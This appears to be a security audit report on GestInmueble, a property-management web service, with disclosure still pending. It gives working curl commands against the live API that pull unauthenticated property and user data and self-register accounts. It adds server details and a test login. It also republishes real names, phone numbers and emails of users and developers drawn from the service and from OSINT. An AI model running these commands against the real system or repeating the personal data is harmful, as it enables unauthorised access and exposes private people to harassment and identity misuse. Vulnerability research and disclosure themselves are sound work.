# GestInmueble — Security Audit Report

**Project:** Rabid Bloodhound
**Target:** GestInmueble (gestinmueble.com / api.gestinmueble.com)
**Developer:** DSegura App / Delmirio Segura Soto / Deibis Segura
**Date:** 10 July 2026
**Classification:** Responsible Disclosure (Pending)

---

## Executive Summary

GestInmueble is a property management SaaS platform by the same developer as PrestamistApp (DSegura App / Soluciones Tecnologicas DSegura SRL). It shares the same vulnerable ASP.NET infrastructure and exposes property listing data and user PII through public API endpoints without authentication.

---

## Vulnerabilities Found

### VULN-1: Data Leak — Public API exposes property listings with GPS coordinates
| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **Endpoint** | `GET /Publico/Inmuebles` (no auth required) |
| **Data exposed** | 162 property listings with prices, GPS coordinates, descriptions, types |

**PoC:**
```bash
curl -sk "https://api.gestinmueble.com/Publico/Inmuebles"
```

**Sample data:**
| Ref | Description | Price | GPS | Beds | Baths |
|-----|-------------|-------|-----|------|-------|
| I00002 | barrio Guayana Unare 2 | $150/mo rent | 8.2718,-62.7701 | 4 | 2 |
| +161 more | — | Various | Exact GPS | — | — |

---

### VULN-2: Data Leak — Public API exposes user PII
| Field | Value |
|-------|-------|
| **Severity** | 🔴 **HIGH** |
| **Endpoint** | `GET /Publico/Usuario/{username}` (no auth required) |
| **Data exposed** | Full name, phone number, email address |

**PoC:**
```bash
curl -sk "https://api.gestinmueble.com/Publico/Usuario/admin"
```

**Users exposed:**
| Username | Name | Phone | Email |
|----------|------|-------|-------|
| `admin` | Daneris Ramirez | +1(829)839-7801 | danerisramirezpena@gmail.com |
| `demo` | Deibi Segura | +1(849)864-1680 | deibi@gmail.com |
| `user` | Juan David Gómez | +57(310)501-7983 | gomez13gta13@gmail.com |
| `admin1` | mth admin | 8 | — |

---

### VULN-3: Open Registration with automatic access
| Field | Value |
|-------|-------|
| **Severity** | 🟠 **HIGH** |
| **Endpoint** | `POST /Register` |
| **Impact** | Anyone can register and obtain a JWT token with "Titular" role |

**PoC:**
```bash
curl -sk -X POST 'https://api.gestinmueble.com/register' \
  -H 'Content-Type: application/json' \
  -d '{
    "UsuInicioSesion": "testuser",
    "UsuNombres": "Test",
    "UsuApellidos": "User",
    "UsuClave": "Test1234!",
    "UsuConfirmarClave": "Test1234!",
    "UsuEmail": "test@mailinator.com",
    "UsuTelefono": "18095551234"
  }'
```

---

### VULN-4: Swagger UI Exposed
| Field | Value |
|-------|-------|
| **Severity** | 🟡 **MEDIUM** |
| **Endpoint** | `/swagger/v1/swagger.json` |
| **Details** | API documentation with all endpoints, schemas, and parameters |

---

## Attack Surface

### API Endpoints Discovered

**Public (no auth required):**
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/Publico/Inmuebles` | GET | List all properties (paginated) |
| `/Publico/Inmuebles/{id}` | GET | Single property details |
| `/Publico/Usuario/{user}` | GET | User profile by username |
| `/Publico/Solicitud` | POST | Submit requests |
| `/Login` | POST | Authentication |
| `/Register` | POST | User registration |

**Authenticated (JWT required):**
| Endpoint | Method | Description |
|----------|--------|-------------|
| `/Clientes` | GET/POST/PUT/DELETE | Client CRUD |
| `/Inmuebles` | GET/POST/PUT/DELETE | Property CRUD |
| `/Selects/Clientes` | GET | Client selection list |
| `/Selects/Inmuebles` | GET | Property selection list |

---

## Data Extracted

**File:** `/root/bounty/gestinmueble_properties.json`
- 162 properties with GPS coordinates, prices, descriptions

**File:** `/root/bounty/gestinmueble_users.json`
- 4 users with PII (name, phone, email)

---

## OSINT — Responsible Parties

| Person | Role | Contact |
|--------|------|---------|
| **Delmirio Segura Soto** | CEO / Director Ejecutivo | — |
| **Deibis Segura** | Gerente General | deibisoto12@gmail.com / segura12s@gmail.com |
| **DSegura App** | Google Play Publisher | — |
| **Soluciones Tecnologicas DSegura SRL** | Legal Entity | RNC 1-32-293-XXX |

---

## Technical Stack

| Component | Technology |
|-----------|------------|
| Web Server | Microsoft-IIS/10.0 |
| Framework | ASP.NET |
| API Documentation | Swagger UI |
| Hosting | PleskWin |
| Server IP | 173.214.170.82 |
| Auth | JWT Bearer Tokens |
| Database | SQL Server (inferred) |

---

## Credentials (test accounts)

```
rbhgest2 / RbhGest2026!   → JWT obtained ✅
```

---

## Recommendations

1. Require authentication on `/Publico/Usuario/{username}` and `/Publico/Inmuebles`
2. Disable Swagger UI in production
3. Require email verification before granting access
4. Implement rate limiting on public endpoints
5. Review and restrict user enumeration vectors
6. Rotate all existing API keys and JWT secrets
